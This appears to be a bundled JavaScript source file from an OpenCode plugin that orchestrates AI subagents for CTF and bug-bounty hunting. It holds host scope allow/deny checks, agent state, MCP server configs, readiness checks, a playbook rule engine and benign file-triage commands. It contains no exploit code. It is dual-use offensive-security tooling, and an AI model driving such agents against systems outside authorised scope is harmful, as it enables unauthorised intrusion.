  const normalized = normalizeHost(host);
  if (!normalized) {
    return { allowed: false, reason: "empty_host" };
  }
  const deniedExact = new Set(policy.deniedHostsExact);
  const deniedSuffix = policy.deniedHostsSuffix;
  if (deniedExact.has(normalized)) {
    return { allowed: false, reason: `host_denied_exact:${normalized}` };
  }
  for (const suffix of deniedSuffix) {
    if (normalized === suffix || normalized.endsWith(`.${suffix}`)) {
      return { allowed: false, reason: `host_denied_suffix:${suffix}` };
    }
  }
  const allowedExact = new Set(policy.allowedHostsExact);
  const allowedSuffix = policy.allowedHostsSuffix;
  if (allowedExact.has(normalized)) {
    return { allowed: true };
  }
  for (const suffix of allowedSuffix) {
    if (normalized.endsWith(`.${suffix}`)) {
      return { allowed: true };
    }
  }
  return { allowed: false, reason: "host_not_in_allowlist" };
}
function isInBlackout(now, windows) {
  const day = now.getDay();
  const minutes = now.getHours() * 60 + now.getMinutes();
  for (const w of windows) {
    if (w.day !== day)
      continue;
    if (w.startMinutes <= minutes && minutes <= w.endMinutes)
      return true;
  }
  return false;
}

// src/state/types.ts
var TARGET_TYPES = [
  "WEB_API",
  "WEB3",
  "PWN",
  "REV",
  "CRYPTO",
  "FORENSICS",
  "MISC",
  "UNKNOWN"
];
var DEFAULT_STATE = {
  mode: "BOUNTY",
  modeExplicit: false,
  ultraworkEnabled: false,
  thinkMode: "none",
  autoLoopEnabled: false,
  autoLoopIterations: 0,
  autoLoopStartedAt: 0,
  autoLoopLastPromptAt: 0,
  phase: "SCAN",
  targetType: "UNKNOWN",
  scopeConfirmed: false,
  candidatePendingVerification: false,
  latestCandidate: "",
  latestVerified: "",
  latestAcceptanceEvidence: "",
  candidateLevel: "L0",
  submissionPending: false,
  submissionAccepted: false,
  hypothesis: "",
  alternatives: [],
  noNewEvidenceLoops: 0,
  samePayloadLoops: 0,
  staleToolPatternLoops: 0,
  lastToolPattern: "",
  contradictionPivotDebt: 0,
  contradictionPatchDumpDone: false,
  contradictionArtifactLockActive: false,
  contradictionArtifacts: [],
  mdScribePrimaryStreak: 0,
  verifyFailCount: 0,
  readonlyInconclusiveCount: 0,
  contextFailCount: 0,
  timeoutFailCount: 0,
  envParityChecked: false,
  envParityAllMatch: false,
  envParityRequired: false,
  envParityRequirementReason: "",
  envParitySummary: "",
  envParityUpdatedAt: 0,
  revVmSuspected: false,
  revLoaderVmDetected: false,
  revRiskScore: 0,
  revRiskSignals: [],
  revStaticTrust: 1,
  decoySuspect: false,
  decoySuspectReason: "",
  oraclePassCount: 0,
  oracleFailIndex: -1,
  oracleTotalTests: 0,
  oracleProgressUpdatedAt: 0,
  oracleProgressImprovedAt: 0,
  contradictionSLALoops: 0,
  contradictionSLADumpRequired: false,
  unsatCrossValidationCount: 0,
  unsatUnhookedOracleRun: false,
  unsatArtifactDigestVerified: false,
  replayLowTrustBinaries: [],
  toolCallCount: 0,
  aegisToolCallCount: 0,
  lastToolCallAt: 0,
  toolCallHistory: [],
  recentEvents: [],
  lastTaskCategory: "",
  lastTaskRoute: "",
  lastTaskSubagent: "",
  lastTaskModel: "",
  lastTaskVariant: "",
  pendingTaskFailover: false,
  taskFailoverCount: 0,
  dispatchHealthBySubagent: {},
  subagentProfileOverrides: {},
  modelHealthByModel: {},
  lastFailureReason: "none",
  lastFailureSummary: "",
  lastFailedRoute: "",
  lastFailureAt: 0,
  failureReasonCounts: {
    none: 0,
    verification_mismatch: 0,
    tooling_timeout: 0,
    context_overflow: 0,
    hypothesis_stall: 0,
    unsat_claim: 0,
    static_dynamic_contradiction: 0,
    exploit_chain: 0,
    environment: 0
  },
  lastUpdatedAt: Date.now()
};

// src/mcp/context7.ts
var context7 = {
  type: "remote",
  url: "https://mcp.context7.com/mcp",
  enabled: true
};

// src/mcp/grep-app.ts
var grep_app = {
  type: "remote",
  url: "https://mcp.grep.app",
  enabled: true
};

// src/mcp/memory.ts
import { isAbsolute, join as join3, resolve } from "path";
function createMemoryMcp(params) {
  const storageDir = params.storageDir?.trim() ? params.storageDir.trim() : ".Aegis/memory";
  const absDir = isAbsolute(storageDir) ? storageDir : resolve(params.projectDir, storageDir);
  const filePath = join3(absDir, "memory.jsonl");
  return {
    type: "local",
    command: ["npx", "-y", "@modelcontextprotocol/server-memory"],
    environment: {
      MEMORY_FILE_PATH: filePath
    },
    enabled: true
  };
}

// src/mcp/sequential-thinking.ts
var sequential_thinking = {
  type: "local",
  command: ["npx", "-y", "@modelcontextprotocol/server-sequential-thinking"],
  enabled: true
};

// src/mcp/websearch.ts
var websearch = {
  type: "remote",
  url: "https://mcp.exa.ai/mcp",
  enabled: true
};

// src/mcp/index.ts
function createBuiltinMcps(params) {
  const disabledMcps = params.disabledMcps ?? [];
  const allBuiltinMcps = {
    context7,
    grep_app,
    websearch,
    memory: createMemoryMcp({ projectDir: params.projectDir, storageDir: params.memoryStorageDir }),
    sequential_thinking
  };
  const mcps = {};
  for (const [name, config2] of Object.entries(allBuiltinMcps)) {
    if (!disabledMcps.includes(name)) {
      mcps[name] = config2;
    }
  }
  return mcps;
}

// src/config/readiness.ts
var MODES = ["CTF", "BOUNTY"];
function resolveOpencodeConfigPath(projectDir) {
  const home = process.env.HOME ?? "";
  const xdg = process.env.XDG_CONFIG_HOME ?? "";
  const appData = process.env.APPDATA ?? "";
  const baseCandidates = [
    join4(projectDir, ".opencode", "opencode"),
    join4(projectDir, "opencode"),
    xdg ? join4(xdg, "opencode", "opencode") : "",
    join4(home, ".config", "opencode", "opencode"),
    appData ? join4(appData, "opencode", "opencode") : ""
  ];
  const candidates = [
    ...baseCandidates.map((base) => base ? `${base}.jsonc` : ""),
    ...baseCandidates.map((base) => base ? `${base}.json` : "")
  ];
  for (const candidate of candidates) {
    if (candidate && existsSync3(candidate)) {
      return candidate;
    }
  }
  return null;
}
function parseOpencodeConfig(path) {
  try {
    const raw = readFileSync3(path, "utf-8");
    const parsed = JSON.parse(stripJsonComments(raw));
    if (!isRecord(parsed)) {
      return { data: null, warning: `OpenCode config is not an object: ${path}` };
    }
    return { data: parsed };
  } catch (error48) {
    const message = error48 instanceof Error ? error48.message : String(error48);
    return {
      data: null,
      warning: `Failed to parse OpenCode config '${path}': ${message}`
    };
  }
}
function extractAgentMap(config2) {
  const out = {};
  const candidates = [config2.agent, config2.agents];
  for (const candidate of candidates) {
    if (!isRecord(candidate)) {
      continue;
    }
    for (const [key, value] of Object.entries(candidate)) {
      if (isRecord(value)) {
        out[key] = value;
      }
    }
  }
  return out;
}
function requiredSubagentsForTarget(config2, mode, targetType) {
  const routing = mode === "CTF" ? config2.routing.ctf : config2.routing.bounty;
  const profile = mode === "CTF" ? config2.capability_profiles.ctf[targetType] : config2.capability_profiles.bounty[targetType];
  return [
    ...new Set([
      routing.scan[targetType],
      routing.plan[targetType],
      routing.execute[targetType],
      routing.stuck[targetType],
      routing.failover[targetType],
      ...profile.required_subagents
    ])
  ];
}
function providerIdFromModel2(model) {
  const trimmed = model.trim();
  const idx = trimmed.indexOf("/");
  if (idx === -1)
    return trimmed;
  return trimmed.slice(0, idx);
}
function collectRequiredProviders(requiredSubagents) {
  const providers = new Set;
  for (const name of requiredSubagents) {
    const model = agentModel(name);
    if (!model)
      continue;
    const provider = providerIdFromModel2(model);
    if (!provider)
      continue;
    providers.add(provider);
  }
  return [...providers].sort();
}
function collectPluginEntries(config2) {
  const plugins = Array.isArray(config2.plugin) ? config2.plugin : [];
  return plugins.filter((value) => typeof value === "string");
}
function buildReadinessReport(projectDir, notesStore, config2) {
  const notesWritable = notesStore.checkWritable();
  const scopeDocResult = loadScopePolicyFromWorkspace(projectDir, {
    candidates: config2.bounty_policy.scope_doc_candidates,
    includeApexForWildcardAllow: config2.bounty_policy.include_apex_for_wildcard_allow
  });
  const scopeDoc = scopeDocResult.ok ? {
    found: true,
    path: scopeDocResult.policy.sourcePath,
    warnings: scopeDocResult.policy.warnings,
    allowedHostsCount: scopeDocResult.policy.allowedHostsExact.length + scopeDocResult.policy.allowedHostsSuffix.length,
    deniedHostsCount: scopeDocResult.policy.deniedHostsExact.length + scopeDocResult.policy.deniedHostsSuffix.length,
    blackoutWindowsCount: scopeDocResult.policy.blackoutWindows.length
  } : {
    found: false,
    path: null,
    warnings: [scopeDocResult.reason, ...scopeDocResult.warnings],
    allowedHostsCount: 0,
    deniedHostsCount: 0,
    blackoutWindowsCount: 0
  };
  const requiredSubagents = new Set(requiredDispatchSubagents(config2));
  requiredSubagents.add(config2.failover.map.explore);
  requiredSubagents.add(config2.failover.map.librarian);
  requiredSubagents.add(config2.failover.map.oracle);
  const coverageByTarget = {};
  const requiredMcps = config2.enable_builtin_mcps ? Object.keys(createBuiltinMcps({
    projectDir,
    disabledMcps: config2.disabled_mcps,
    memoryStorageDir: config2.memory.storage_dir
  })) : [];
  const warnings = [];
  const issues = [];
  if (!notesWritable.ok) {
    issues.push(...notesWritable.issues);
  }
  if (config2.bounty_policy.require_scope_doc && !scopeDoc.found) {
    issues.push(`Missing bounty scope document (required): ${scopeDoc.warnings.join("; ")}`);
  } else if (!scopeDoc.found) {
    warnings.push(`No bounty scope document detected: ${scopeDoc.warnings.join("; ")}`);
  }
  const configPath = resolveOpencodeConfigPath(projectDir);
  if (!configPath) {
    const message = "No OpenCode config file found; subagent/MCP mapping checks unavailable.";
    if (config2.strict_readiness) {
      issues.push(message);
    } else {
      warnings.push(message);
    }
    return {
      ok: issues.length === 0,
      notesWritable: notesWritable.ok,
      checkedConfigPath: null,
      scopeDoc,
      requiredSubagents: [...requiredSubagents],
      missingSubagents: [],
      requiredProviders: [],
      missingProviders: [],
      requiredMcps,
      missingMcps: [],
      missingAuthPlugins: [],
      coverageByTarget,
      issues,
      warnings
    };
  }
  const parsed = parseOpencodeConfig(configPath);
  if (!parsed.data) {
    if (parsed.warning) {
      if (config2.strict_readiness) {
        issues.push(parsed.warning);
      } else {
        warnings.push(parsed.warning);
      }
    }
    return {
      ok: issues.length === 0,
      notesWritable: notesWritable.ok,
      checkedConfigPath: configPath,
      scopeDoc,
      requiredSubagents: [...requiredSubagents],
      missingSubagents: [],
      requiredProviders: [],
      missingProviders: [],
      requiredMcps,
      missingMcps: [],
      missingAuthPlugins: [],
      coverageByTarget,
      issues,
      warnings
    };
  }
  const availableMap = extractAgentMap(parsed.data);
  const available = new Set(Object.keys(availableMap));
  const missingSubagents = [...requiredSubagents].filter((name) => !available.has(name));
  if (missingSubagents.length > 0) {
    issues.push(`Missing required subagent mappings: ${missingSubagents.join(", ")}`);
  }
  const mcpMap = isRecord(parsed.data.mcp) ? parsed.data.mcp : {};
  const missingMcps = requiredMcps.filter((name) => !isRecord(mcpMap[name]));
  if (missingMcps.length > 0) {
    issues.push(`Missing required MCP mappings: ${missingMcps.join(", ")}`);
  }
  const requiredProviders = collectRequiredProviders(requiredSubagents);
  const providerMap = isRecord(parsed.data.provider) ? parsed.data.provider : {};
  const missingProviders = requiredProviders.filter((name) => {
    if (name === "opencode") {
      return false;
    }
    return !isRecord(providerMap[name]);
  });
  if (missingProviders.length > 0) {
    warnings.push(`Missing required provider mappings: ${missingProviders.join(", ")}`);
  }
  const plugins = collectPluginEntries(parsed.data);
  const missingAuthPlugins = [];
  if (requiredProviders.includes("openai")) {
    const hasOpenAICodexAuthPlugin = plugins.some((entry) => entry === "opencode-openai-codex-auth" || entry.startsWith("opencode-openai-codex-auth@"));
    if (!hasOpenAICodexAuthPlugin) {
      missingAuthPlugins.push("opencode-openai-codex-auth");
      warnings.push("OpenAI provider is used but opencode-openai-codex-auth plugin is missing.");
    }
  }
  for (const mode of MODES) {
    for (const targetType of TARGET_TYPES) {
      const key = `${mode}:${targetType}`;
      const required2 = requiredSubagentsForTarget(config2, mode, targetType);
      const missing = required2.filter((name) => !available.has(name));
      coverageByTarget[key] = {
        requiredSubagents: required2,
        missingSubagents: missing
      };
      if (missing.length > 0) {
        issues.push(`[${key}] missing subagents: ${missing.join(", ")}`);
      }
    }
  }
  return {
    ok: issues.length === 0,
    notesWritable: notesWritable.ok,
    checkedConfigPath: configPath,
    scopeDoc,
    requiredSubagents: [...requiredSubagents],
    missingSubagents,
    requiredProviders,
    missingProviders,
    requiredMcps,
    missingMcps,
    missingAuthPlugins,
    coverageByTarget,
    issues,
    warnings
  };
}

// src/orchestration/playbook-loader.ts
import { existsSync as existsSync4, readdirSync, readFileSync as readFileSync4, statSync as statSync2 } from "fs";
import { dirname, join as join5 } from "path";
import { fileURLToPath } from "url";

// node_modules/yaml/dist/index.js
var composer = require_composer();
var Document = require_Document();
var Schema = require_Schema();
var errors3 = require_errors();
var Alias = require_Alias();
var identity = require_identity();
var Pair = require_Pair();
var Scalar = require_Scalar();
var YAMLMap = require_YAMLMap();
var YAMLSeq = require_YAMLSeq();
var cst = require_cst();
var lexer = require_lexer();
var lineCounter = require_line_counter();
var parser = require_parser();
var publicApi = require_public_api();
var visit = require_visit();
var $Composer = composer.Composer;
var $Document = Document.Document;
var $Schema = Schema.Schema;
var $YAMLError = errors3.YAMLError;
var $YAMLParseError = errors3.YAMLParseError;
var $YAMLWarning = errors3.YAMLWarning;
var $Alias = Alias.Alias;
var $isAlias = identity.isAlias;
var $isCollection = identity.isCollection;
var $isDocument = identity.isDocument;
var $isMap = identity.isMap;
var $isNode = identity.isNode;
var $isPair = identity.isPair;
var $isScalar = identity.isScalar;
var $isSeq = identity.isSeq;
var $Pair = Pair.Pair;
var $Scalar = Scalar.Scalar;
var $YAMLMap = YAMLMap.YAMLMap;
var $YAMLSeq = YAMLSeq.YAMLSeq;
var $Lexer = lexer.Lexer;
var $LineCounter = lineCounter.LineCounter;
var $Parser = parser.Parser;
var $parse = publicApi.parse;
var $parseAllDocuments = publicApi.parseAllDocuments;
var $parseDocument = publicApi.parseDocument;
var $stringify = publicApi.stringify;
var $visit = visit.visit;
var $visitAsync = visit.visitAsync;

// src/orchestration/playbook-loader.ts
var TRIGGER_STATE_FIELDS = [
  "mode",
  "targetType",
  "decoySuspect",
  "interactiveEnabled",
  "sequentialThinkingActive",
  "sequentialThinkingToolName",
  "contradictionPatchDumpDone",
  "staleToolPatternLoops",
  "noNewEvidenceLoops",
  "contradictionPivotDebt"
];
var TriggerStateFieldSchema = exports_external.enum(TRIGGER_STATE_FIELDS);
var TriggerPatternSchema = exports_external.object({
  modes: exports_external.array(exports_external.string()).optional(),
  targets: exports_external.array(exports_external.string()).optional()
}).strict();
var TriggerStateConditionSchema = exports_external.object({
  field: TriggerStateFieldSchema,
  equals: exports_external.union([exports_external.string(), exports_external.number(), exports_external.boolean()])
}).strict();
var TriggerCounterConditionSchema = exports_external.object({
  field: TriggerStateFieldSchema,
  gt: exports_external.number().optional(),
  gte: exports_external.number().optional(),
  lt: exports_external.number().optional(),
  lte: exports_external.number().optional()
}).strict().refine((value) => value.gt !== undefined || value.gte !== undefined || value.lt !== undefined || value.lte !== undefined, {
  message: "counter condition requires at least one comparator"
});
var PlaybookTriggerSchema = exports_external.object({
  pattern: TriggerPatternSchema.optional(),
  states: exports_external.array(TriggerStateConditionSchema).default([]),
  counters: exports_external.array(TriggerCounterConditionSchema).default([])
}).strict();
var PlaybookStateMutationSchema = exports_external.object({
  flags: exports_external.array(exports_external.string()).default([]),
  events: exports_external.array(exports_external.string()).default([])
}).strict();
var PlaybookNextActionSchema = exports_external.object({
  tool: exports_external.string().optional(),
  route: exports_external.string().optional()
}).strict().refine((value) => Boolean(value.tool) || Boolean(value.route), {
  message: "mandatory_next_action requires at least one of tool or route"
});
var PlaybookRuleSchema = exports_external.object({
  id: exports_external.string().min(1),
  order: exports_external.number().int(),
  lines: exports_external.array(exports_external.string()).min(1),
  trigger: PlaybookTriggerSchema,
  state_mutation: PlaybookStateMutationSchema,
  mandatory_next_action: PlaybookNextActionSchema
}).strict();
var PlaybookRegistrySchema = exports_external.object({
  version: exports_external.number().int(),
  base_rules: exports_external.array(PlaybookRuleSchema),
  conditional_rules: exports_external.array(PlaybookRuleSchema)
}).strict();
function isExistingDirectory(path) {
  if (!existsSync4(path)) {
    return false;
  }
  try {
    return statSync2(path).isDirectory();
  } catch {
    return false;
  }
}
function resolvePlaybooksRoot(baseDir) {
  const candidates = [join5(baseDir, "../playbooks"), join5(baseDir, "../../playbooks")];
  for (const candidate of candidates) {
    if (isExistingDirectory(candidate)) {
      return candidate;
    }
  }
  throw new Error(`playbook-loader: failed to resolve playbooks directory; tried: ${candidates.join(", ")}`);
}
function playbooksRoot() {
  const baseDir = dirname(fileURLToPath(import.meta.url));
  return resolvePlaybooksRoot(baseDir);
}
function yamlFilesSorted(root) {
  const stack = [root];
  const files = [];
  while (stack.length > 0) {
    const current = stack.pop();
    if (!current) {
      continue;
    }
    const entries = readdirSync(current, { withFileTypes: true });
    for (const entry of entries) {
      const nextPath = join5(current, entry.name);
      if (entry.isDirectory()) {
        stack.push(nextPath);
        continue;
      }
      if (entry.isFile() && nextPath.endsWith(".yaml")) {
        files.push(nextPath);
      }
    }
  }
  files.sort((left, right) => left.localeCompare(right));
  return files;
}
function formatParseError(error48) {
  if (error48 instanceof Error) {
    return error48.message;
  }
  return String(error48);
}
function parsePlaybookFile(path) {
  const raw = readFileSync4(path, "utf-8");
  let parsed;
  try {
    parsed = $parse(raw);
  } catch (yamlError) {
    try {
      const stripped = stripJsonComments(raw);
      parsed = JSON.parse(stripped);
    } catch (jsonError) {
      throw new Error(`playbook-loader: failed to parse playbook file ${path}; yaml: ${formatParseError(yamlError)}; json_fallback: ${formatParseError(jsonError)}`);
    }
  }
  try {
    return parsePlaybookRegistry(parsed);
  } catch (error48) {
    throw new Error(`playbook-loader: invalid playbook registry in ${path}: ${formatParseError(error48)}`);
  }
}
function parsePlaybookRegistry(input) {
  return PlaybookRegistrySchema.parse(input);
}
function mergeRegistries(registries2) {
  const merged = {
    version: 1,
    base_rules: [],
    conditional_rules: []
  };
  for (const registry2 of registries2) {
    merged.base_rules.push(...registry2.base_rules);
    merged.conditional_rules.push(...registry2.conditional_rules);
  }
  merged.base_rules.sort((left, right) => left.order - right.order || left.id.localeCompare(right.id));
  merged.conditional_rules.sort((left, right) => left.order - right.order || left.id.localeCompare(right.id));
  return merged;
}
var cachedRegistry = null;
function loadPlaybookRegistry() {
  if (cachedRegistry) {
    return cachedRegistry;
  }
  const root = playbooksRoot();
  const files = yamlFilesSorted(root);
  const registries2 = files.map((path) => parsePlaybookFile(path));
  cachedRegistry = mergeRegistries(registries2);
  return cachedRegistry;
}

// src/orchestration/playbook-engine.ts
function evaluateStateCondition(context, field, equals) {
  const value = context[field];
  return value === equals;
}
function evaluateCounterCondition(context, field, comparator) {
  const raw = context[field];
  if (typeof raw !== "number") {
    return false;
  }
  if (comparator.gt !== undefined && !(raw > comparator.gt)) {
    return false;
  }
  if (comparator.gte !== undefined && !(raw >= comparator.gte)) {
    return false;
  }
  if (comparator.lt !== undefined && !(raw < comparator.lt)) {
    return false;
  }
  if (comparator.lte !== undefined && !(raw <= comparator.lte)) {
    return false;
  }
  return true;
}
function matchesPlaybookRule(rule, context) {
  const { pattern, states, counters } = rule.trigger;
  if (pattern?.modes && !pattern.modes.includes(context.mode)) {
    return false;
  }
  if (pattern?.targets && !pattern.targets.includes(context.targetType)) {
    return false;
  }
  for (const condition of states) {
    if (!evaluateStateCondition(context, condition.field, condition.equals)) {
      return false;
    }
  }
  for (const condition of counters) {
    if (!evaluateCounterCondition(context, condition.field, condition)) {
      return false;
    }
  }
  return true;
}
function renderPlaybookTemplate(text, context) {
  return text.replace(/\{([a-zA-Z0-9_]+)\}/g, (_, key) => {
    const value = context[key];
    return value === undefined ? `{${key}}` : String(value);
  });
}
function isStuckForPlaybook(state, config2) {
  const now = Date.now();
  if (now - state.oracleProgressImprovedAt <= 10 * 60 * 1000) {
    return false;
  }
  const threshold = config2.stuck_threshold;
  return state.noNewEvidenceLoops >= threshold || state.samePayloadLoops >= threshold || state.verifyFailCount >= threshold;
}
function isSequentialThinkingActive(state, config2) {
  if (!config2.sequential_thinking.enabled) {
    return false;
  }
  const targetOk = config2.sequential_thinking.activate_targets.includes(state.targetType);
  const phaseOk = config2.sequential_thinking.activate_phases.includes(state.phase);
  const stuckOk = config2.sequential_thinking.activate_on_stuck && isStuckForPlaybook(state, config2);
  const thinkingOk = !config2.sequential_thinking.disable_with_thinking_model || state.thinkMode === "none";
  return thinkingOk && (targetOk && phaseOk || stuckOk);
}
function buildPlaybookContext(state, config2) {
  const interactiveEnabled = config2.interactive.enabled || config2.interactive.enabled_in_ctf;
  return {
    mode: state.mode,
    targetType: state.targetType,
    decoySuspect: state.decoySuspect,
    interactiveEnabled,
    sequentialThinkingActive: isSequentialThinkingActive(state, config2),
    sequentialThinkingToolName: config2.sequential_thinking.tool_name,
    contradictionPatchDumpDone: state.contradictionPatchDumpDone,
    staleToolPatternLoops: state.staleToolPatternLoops,
    noNewEvidenceLoops: state.noNewEvidenceLoops,
    contradictionPivotDebt: state.contradictionPivotDebt
  };
}
function findMatchingPlaybookRule(registry2, context) {
  for (const rule of registry2.base_rules) {
    if (matchesPlaybookRule(rule, context)) {
      return rule;
    }
  }
  for (const rule of registry2.conditional_rules) {
    if (matchesPlaybookRule(rule, context)) {
      return rule;
    }
  }
  return null;
}
function findMatchingConditionalRule(registry2, context) {
  for (const rule of registry2.conditional_rules) {
    if (matchesPlaybookRule(rule, context)) {
      return rule;
    }
  }
  return null;
}
function findPlaybookNextAction(state, config2) {
  const registry2 = loadPlaybookRegistry();
  const context = buildPlaybookContext(state, config2);
  const conditionalRule = findMatchingConditionalRule(registry2, context);
  const rule = conditionalRule ?? findMatchingPlaybookRule(registry2, context);
  if (!rule) {
    return null;
  }
  return {
    ruleId: rule.id,
    tool: rule.mandatory_next_action.tool,
    route: rule.mandatory_next_action.route
  };
}
function findPlaybookNextRouteAction(state, config2) {
  const registry2 = loadPlaybookRegistry();
  const context = buildPlaybookContext(state, config2);
  for (const rule of registry2.conditional_rules) {
    if (matchesPlaybookRule(rule, context) && rule.mandatory_next_action.route) {
      return {
        ruleId: rule.id,
        tool: rule.mandatory_next_action.tool,
        route: rule.mandatory_next_action.route
      };
    }
  }
  for (const rule of registry2.base_rules) {
    if (matchesPlaybookRule(rule, context) && rule.mandatory_next_action.route) {
      return {
        ruleId: rule.id,
        tool: rule.mandatory_next_action.tool,
        route: rule.mandatory_next_action.route
      };
    }
  }
  return null;
}

// src/orchestration/playbook.ts
function buildTaskPlaybook(state, config2) {
  const header = "[oh-my-Aegis domain-playbook]";
  const context = buildPlaybookContext(state, config2);
  const registry2 = loadPlaybookRegistry();
  const baseRule = registry2.base_rules.find((entry) => matchesPlaybookRule(entry, context));
  const lines = [header, `mode=${state.mode}`, `target=${state.targetType}`, "rules:"];
  if (baseRule) {
    for (const text of baseRule.lines) {
      lines.push(`- ${renderPlaybookTemplate(text, context)}`);
    }
  }
  for (const rule of registry2.conditional_rules) {
    if (!matchesPlaybookRule(rule, context)) {
      continue;
    }
    for (const text of rule.lines) {
      lines.push(`- ${renderPlaybookTemplate(text, context)}`);
    }
  }
  return lines.join(`
`);
}
function hasPlaybookMarker(prompt) {
  return prompt.includes("[oh-my-Aegis domain-playbook]");
}

// src/orchestration/auto-triage.ts
var EXTENSION_HINTS = [
  { extensions: [".elf", ".so", ".o", ".out", ".bin"], detectedType: "elf" },
  { extensions: [".zip", ".tar", ".tgz", ".gz", ".bz2", ".xz", ".7z", ".rar"], detectedType: "archive" },
  { extensions: [".png", ".jpg", ".jpeg", ".gif", ".bmp", ".webp", ".tif", ".tiff"], detectedType: "image" },
  { extensions: [".pcap", ".pcapng", ".cap"], detectedType: "pcap" },
  { extensions: [".pdf"], detectedType: "pdf" },
  { extensions: [".html", ".htm", ".json", ".xml", ".yaml", ".yml"], detectedType: "web" },
  {
    extensions: [".sh", ".py", ".rb", ".pl", ".php", ".js", ".ts", ".lua", ".ps1"],
    detectedType: "script"
  }
];
var FILE_OUTPUT_HINTS = [
  { pattern: /\belf\b/i, detectedType: "elf" },
  {
    pattern: /\b(zip archive|tar archive|gzip compressed|bzip2 compressed|xz compressed|7-zip|rar archive)\b/i,
    detectedType: "archive"
  },
  {
    pattern: /\b(png image|jpeg image|gif image|bitmap|tiff image|webp image|svg image)\b/i,
    detectedType: "image"
  },
  { pattern: /\b(pcap|capture file)\b/i, detectedType: "pcap" },
  { pattern: /\bpdf document\b/i, detectedType: "pdf" },
  {
    pattern: /\b(shell script|python script|perl script|ruby script|php script|javascript source|typescript source)\b/i,
    detectedType: "script"
  },
  { pattern: /\b(html document|json data|xml document)\b/i, detectedType: "web" }
];
function shellQuote(value) {
  return `'${value.replace(/'/g, `'"'"'`)}'`;
}
function normalizedExtension(filePath) {
  const lower = filePath.trim().toLowerCase();
  if (lower.endsWith(".tar.gz") || lower.endsWith(".tgz")) {
    return ".tgz";
  }
  const dot = lower.lastIndexOf(".");
  return dot >= 0 ? lower.slice(dot) : "";
}
function detectFileType(filePath, fileOutput) {
  const output = fileOutput ?? "";
  for (const hint of FILE_OUTPUT_HINTS) {
    if (hint.pattern.test(output)) {
      return hint.detectedType;
    }
  }
  const ext = normalizedExtension(filePath);
  for (const hint of EXTENSION_HINTS) {
    if (hint.extensions.includes(ext)) {
      return hint.detectedType;
    }
  }
  if (/^https?:\/\//i.test(filePath.trim())) {
    return "web";
  }
  return "unknown";
}
function suggestTarget(detectedType) {
  switch (detectedType) {
    case "elf":
      return "PWN";
    case "web":
      return "WEB_API";
    case "archive":
    case "image":
    case "pcap":
    case "pdf":
      return "FORENSICS";
    case "script":
      return "MISC";
    default:
      return "UNKNOWN";
  }
}
function generateTriageCommands(filePath, detectedType) {
  const quoted = shellQuote(filePath);
  const ext = normalizedExtension(filePath);
  if (detectedType === "elf") {
    return [
      { tool: "file", command: `file ${quoted}`, purpose: "Confirm binary format", phase: 1 },
      {
        tool: "checksec",
        command: `checksec --file=${quoted}`,
        purpose: "Inspect binary mitigations",
        phase: 1
      },
      { tool: "readelf", command: `readelf -h ${quoted}`, purpose: "Inspect ELF headers", phase: 1 },
      {
        tool: "strings",
        command: `strings ${quoted} | grep -iE "flag|CTF" | head -20`,
        purpose: "Find CTF indicators quickly",
        phase: 1
      },
      { tool: "ldd", command: `ldd ${quoted}`, purpose: "Inspect linked libraries", phase: 2 },
      {
        tool: "readelf",
        command: `readelf -S ${quoted}`,
        purpose: "List all section headers (REV VM detection)",
        phase: 2
      },
      {
        tool: "readelf",
        command: `readelf -r ${quoted}`,
        purpose: "List relocations (REV relocation-VM detection)",
        phase: 2
      },
      {
        tool: "binwalk",
        command: `binwalk ${quoted}`,
        purpose: "Detect embedded ELFs (REV Loader detection)",
        phase: 2
      }
    ];
  }
  if (detectedType === "archive") {
    const commands = [
      { tool: "file", command: `file ${quoted}`, purpose: "Confirm archive container", phase: 1 },
      { tool: "binwalk", command: `binwalk ${quoted}`, purpose: "Detect embedded content", phase: 1 },
      { tool: "7z", command: `7z l ${quoted}`, purpose: "List archive entries", phase: 1 }
    ];
    if (ext === ".zip") {
      commands.push({ tool: "unzip", command: `unzip -l ${quoted}`, purpose: "List ZIP members", phase: 1 });
    } else {
      commands.push({ tool: "tar", command: `tar -tf ${quoted}`, purpose: "List TAR-like members", phase: 1 });
    }
    return commands;
  }
  if (detectedType === "image") {
    const commands = [
      { tool: "file", command: `file ${quoted}`, purpose: "Confirm image encoding", phase: 1 },
      { tool: "exiftool", command: `exiftool ${quoted}`, purpose: "Extract metadata", phase: 1 },
      { tool: "binwalk", command: `binwalk ${quoted}`, purpose: "Scan for embedded files", phase: 1 },
      { tool: "strings", command: `strings ${quoted} | head -20`, purpose: "Preview readable strings", phase: 1 }
    ];
    if (ext === ".png") {
      commands.push({ tool: "zsteg", command: `zsteg ${quoted}`, purpose: "Probe PNG steganography", phase: 2 });
    }
    return commands;
  }
  if (detectedType === "pcap") {
    return [
      { tool: "file", command: `file ${quoted}`, purpose: "Confirm capture file format", phase: 1 },
      {
        tool: "tshark",
        command: `tshark -r ${quoted} -q -z io,phs`,
        purpose: "Protocol hierarchy summary",
        phase: 1
      },
      {
        tool: "tshark",
        command: `tshark -r ${quoted} -T fields -e frame.protocols | sort -u`,
        purpose: "List unique protocol stacks",
        phase: 1
      }
    ];
  }
  if (detectedType === "pdf") {
    return [
      { tool: "file", command: `file ${quoted}`, purpose: "Confirm PDF document", phase: 1 },
      { tool: "exiftool", command: `exiftool ${quoted}`, purpose: "Extract metadata", phase: 1 },
      {
        tool: "strings",
        command: `strings ${quoted} | grep -i flag | head -10`,
        purpose: "Find likely flag strings",
        phase: 1
      }
    ];
  }
  if (detectedType === "script" || detectedType === "web") {
    return [
      { tool: "file", command: `file ${quoted}`, purpose: "Confirm text/script type", phase: 1 },
      { tool: "head", command: `head -50 ${quoted}`, purpose: "Inspect top-of-file logic", phase: 1 },
      { tool: "wc", command: `wc -l ${quoted}`, purpose: "Estimate content size", phase: 1 }
    ];
  }
  return [
    { tool: "file", command: `file ${quoted}`, purpose: "Baseline type identification", phase: 1 },
    { tool: "xxd", command: `xxd ${quoted} | head -5`, purpose: "Inspect leading bytes", phase: 1 },
    { tool: "strings", command: `strings ${quoted} | head -20`, purpose: "Preview readable strings", phase: 1 }
  ];
}
function detectRevLoaderVm(readelfSections, readelfRelocs, stringsOutput) {
  const signals = [];
  let hasAbnormalRela = false;
  let hasCustomSections = false;
  let hasEmbeddedElf = false;
  if (readelfSections) {
    const standardSections = new Set([
      ".text",
      ".data",
      ".bss",
      ".rodata",
      ".comment",
      ".note",
      ".symtab",
      ".strtab",
      ".shstrtab",
      ".dynamic",
      ".dynsym",
      ".dynstr",
      ".rel.dyn",
      ".rela.dyn",
      ".rel.plt",
      ".rela.plt",
      ".plt",
      ".plt.got",
      ".plt.sec",
      ".got",
